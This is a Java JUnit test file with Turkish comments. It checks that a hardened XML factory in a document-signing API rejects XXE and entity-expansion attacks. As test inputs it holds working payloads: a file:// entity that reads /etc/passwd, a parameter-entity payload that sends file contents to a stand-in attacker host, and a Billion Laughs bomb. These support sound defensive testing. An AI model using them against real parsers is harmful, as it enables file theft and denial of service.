package io.mersel.dss.signer.api.util.xml;

import io.qameta.allure.Epic;
import io.qameta.allure.Feature;
import io.qameta.allure.Severity;
import io.qameta.allure.SeverityLevel;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.w3c.dom.Document;
import org.xml.sax.SAXParseException;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.StringWriter;
import java.lang.reflect.Constructor;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

/**
 * {@link SecureXmlFactories} için hardening sözleşmesi testleri.
 *
 * <p>Bu testler regresyon korumasıdır: gelecekte biri yanlışlıkla
 * factory'yi güvensizleştirirse build kırılır. Her test bir XXE
 * vektörüne karşılık gelir.</p>
 */
@Epic("XML Security Hardening")
@Feature("Hardened Factory API")
@Severity(SeverityLevel.CRITICAL)
class SecureXmlFactoriesTest {

    @Nested
    @DisplayName("DocumentBuilderFactory hardening")
    class DocumentBuilderFactoryHardening {

        @Test
        @DisplayName("DOCTYPE içeren XML reddedilir (XXE primary defense)")
        void doctypeRejected() {
            String xmlWithDoctype =
                    "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE root [<!ELEMENT root ANY>]>\n" +
                    "<root>hello</root>";

            SAXParseException ex = assertThrows(SAXParseException.class,
                    () -> parse(xmlWithDoctype));
            String msg = ex.getMessage() == null ? "" : ex.getMessage().toLowerCase();
            // Apache Xerces mesajı: "DOCTYPE is disallowed when the feature
            // 'http://apache.org/xml/features/disallow-doctype-decl' is true"
            assertTrue(msg.contains("doctype"),
                    "DOCTYPE reddedilirken anlaşılır bir hata mesajı bekleniyordu, alınan: " + msg);
        }

        @Test
        @DisplayName("XXE: file:// system entity ile yerel dosya okuma denemesi reddedilir")
        void xxeFileExfiltrationBlocked(@TempDir Path tempDir) throws IOException {
            Path secret = tempDir.resolve("secret.txt");
            Files.write(secret, "TOP_SECRET_VALUE".getBytes(StandardCharsets.UTF_8));

            String malicious =
                    "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE root [\n" +
                    "  <!ENTITY xxe SYSTEM \"file://" + secret.toAbsolutePath() + "\">\n" +
                    "]>\n" +
                    "<root>&xxe;</root>";

            // DOCTYPE zaten reddediliyor → entity expansion'a hiç sıra gelmiyor
            assertThrows(SAXParseException.class, () -> parse(malicious));
        }

        @Test
        @DisplayName("XXE: parameter entity ile DTD üzerinden saldırı reddedilir")
        void xxeParameterEntityBlocked() {
            String malicious =
                    "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE root [\n" +
                    "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n" +
                    "  <!ENTITY % wrap \"<!ENTITY exfil SYSTEM 'http://attacker.invalid/?d=%file;'>\">\n" +
                    "  %wrap;\n" +
                    "]>\n" +
                    "<root>&exfil;</root>";

            assertThrows(SAXParseException.class, () -> parse(malicious));
        }

        @Test
        @DisplayName("DoS: Billion Laughs (recursive entity expansion) reddedilir")
        void billionLaughsBlocked() {
            String bombXml =
                    "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE lolz [\n" +
                    "  <!ENTITY lol \"lol\">\n" +
                    "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
                    "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
                    "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
                    "]>\n" +
                    "<lolz>&lol4;</lolz>";

            assertThrows(SAXParseException.class, () -> parse(bombXml));
        }

        @Test
        @DisplayName("Meşru UBL benzeri XML (DOCTYPE'sız) sorunsuz parse edilir")
        void legitimateUblLikeXmlParsesOk() {
            String ublLike =
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<Invoice xmlns=\"urn:oasis:names:specification:ubl:schema:xsd:Invoice-2\"\n" +
                    "         xmlns:cbc=\"urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2\">\n" +
                    "  <cbc:ID>INV-2026-001</cbc:ID>\n" +
                    "  <cbc:IssueDate>2026-05-16</cbc:IssueDate>\n" +
                    "</Invoice>";

            Document doc = assertDoesNotThrow(() -> parse(ublLike));
            assertNotNull(doc);
            assertEquals("Invoice", doc.getDocumentElement().getLocalName());
        }

        @Test
        @DisplayName("Meşru SOAP envelope (DOCTYPE'sız) sorunsuz parse edilir")
        void legitimateSoapEnvelopeParsesOk() {
            String soap =
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                    "  <soap:Header/>\n" +
                    "  <soap:Body>\n" +
                    "    <ping>hello</ping>\n" +
                    "  </soap:Body>\n" +
                    "</soap:Envelope>";

            Document doc = assertDoesNotThrow(() -> parse(soap));
            assertEquals("Envelope", doc.getDocumentElement().getLocalName());
        }

        @Test
        @DisplayName("Namespace-aware false varyantı da hardened (legacy KamuSM XML için)")
        void namespaceUnawareVariantAlsoHardened() {
            DocumentBuilderFactory factory =
                    SecureXmlFactories.newDocumentBuilderFactory(false);

            assertFalse(factory.isNamespaceAware(),
                    "namespaceAware=false verildi, false dönmeli");
            assertFalse(factory.isXIncludeAware(),
                    "XInclude kapalı olmalı (SSRF koruması)");
            assertFalse(factory.isExpandEntityReferences(),
                    "Entity expansion kapalı olmalı");

            String malicious =
                    "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
                    "<root>&xxe;</root>";
            assertThrows(SAXParseException.class, () -> {
                DocumentBuilder b = factory.newDocumentBuilder();
                b.parse(new ByteArrayInputStream(malicious.getBytes(StandardCharsets.UTF_8)));
            });
        }

        @Test
        @DisplayName("Default factory namespace-aware ve XInclude kapalı döner")
        void defaultFactoryHasExpectedFlags() {
            DocumentBuilderFactory factory = SecureXmlFactories.newDocumentBuilderFactory();

            assertTrue(factory.isNamespaceAware());
            assertFalse(factory.isXIncludeAware());
            assertFalse(factory.isExpandEntityReferences());
        }

        @Test
        @DisplayName("disallow-doctype-decl feature gerçekten true olarak set edilmiş")
        void disallowDoctypeFeatureIsTrue() throws Exception {
            DocumentBuilderFactory factory = SecureXmlFactories.newDocumentBuilderFactory();
            assertTrue(factory.getFeature("http://apache.org/xml/features/disallow-doctype-decl"));
            assertTrue(factory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING));
            assertFalse(factory.getFeature("http://xml.org/sax/features/external-general-entities"));
            assertFalse(factory.getFeature("http://xml.org/sax/features/external-parameter-entities"));
            assertFalse(factory.getFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd"));
        }

        private Document parse(String xml) throws Exception {
            DocumentBuilder builder =
                    SecureXmlFactories.newDocumentBuilderFactory().newDocumentBuilder();
            return builder.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
        }
    }

    @Nested
    @DisplayName("TransformerFactory hardening")
    class TransformerFactoryHardening {

        @Test
        @DisplayName("DOM serileştirmesi (yazma) düzgün çalışmaya devam eder")
        void domSerializationStillWorks() throws Exception {
            String src =
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<root><child>v</child></root>";

            DocumentBuilder builder =
                    SecureXmlFactories.newDocumentBuilderFactory().newDocumentBuilder();
            Document doc = builder.parse(new ByteArrayInputStream(src.getBytes(StandardCharsets.UTF_8)));

            TransformerFactory tf = SecureXmlFactories.newTransformerFactory();
            Transformer transformer = tf.newTransformer();
            transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");
            transformer.setOutputProperty(OutputKeys.ENCODING, "UTF-8");

            StringWriter sw = new StringWriter();
            transformer.transform(new DOMSource(doc), new StreamResult(sw));

            String out = sw.toString();
            assertTrue(out.contains("<root>"));
            assertTrue(out.contains("<child>v</child>"));
        }

        @Test
        @DisplayName("DOMSource -> ByteArrayOutputStream akışı düzgün çalışır")
        void domToByteArrayStreamWorks() throws Exception {
            DocumentBuilder builder =
                    SecureXmlFactories.newDocumentBuilderFactory().newDocumentBuilder();
            Document doc = builder.parse(new ByteArrayInputStream(
                    "<a><b/></a>".getBytes(StandardCharsets.UTF_8)));

            TransformerFactory tf = SecureXmlFactories.newTransformerFactory();
            Transformer transformer = tf.newTransformer();
            transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "no");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            transformer.transform(new DOMSource(doc), new StreamResult(baos));

            String result = new String(baos.toByteArray(), StandardCharsets.UTF_8);
            assertTrue(result.contains("<a>"));
            assertTrue(result.contains("<b/>"));
        }

        @Test
        @DisplayName("FEATURE_SECURE_PROCESSING aktif")
        void secureProcessingFeatureEnabled() throws Exception {
            TransformerFactory tf = SecureXmlFactories.newTransformerFactory();
            assertTrue(tf.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING));
        }

        @Test
        @DisplayName("ACCESS_EXTERNAL_DTD / STYLESHEET attribute'ları boş string'e set edilmiş")
        void externalAccessAttributesAreEmpty() {
            TransformerFactory tf = SecureXmlFactories.newTransformerFactory();
            try {
                assertEquals("", tf.getAttribute(XMLConstants.ACCESS_EXTERNAL_DTD));
                assertEquals("", tf.getAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET));
            } catch (IllegalArgumentException notSupported) {
                // Bazı JAXP impl'leri bu attribute'u desteklemez (best-effort).
                // FEATURE_SECURE_PROCESSING ana koruma; bu durum tolere edilir.
            }
        }
    }

    @Nested
    @DisplayName("Sınıf invariant'ları")
    class ClassInvariants {

        @Test
        @DisplayName("SecureXmlFactories utility sınıf invariant'ı: tek private constructor")
        void hasOnlyPrivateConstructor() throws Exception {
            Constructor<?>[] ctors = SecureXmlFactories.class.getDeclaredConstructors();
            assertEquals(1, ctors.length, "Sadece bir (private) constructor olmalı");
            Constructor<?> ctor = ctors[0];
            int modifiers = ctor.getModifiers();
            assertTrue(java.lang.reflect.Modifier.isPrivate(modifiers),
                    "Constructor private olmalı (utility sınıf invariant'ı)");
            ctor.setAccessible(true);
            try {
                ctor.newInstance();
            } catch (Exception e) {
                fail("Private constructor reflection ile invoke edilebilmeli: " + e.getMessage());
            }
        }
    }
}
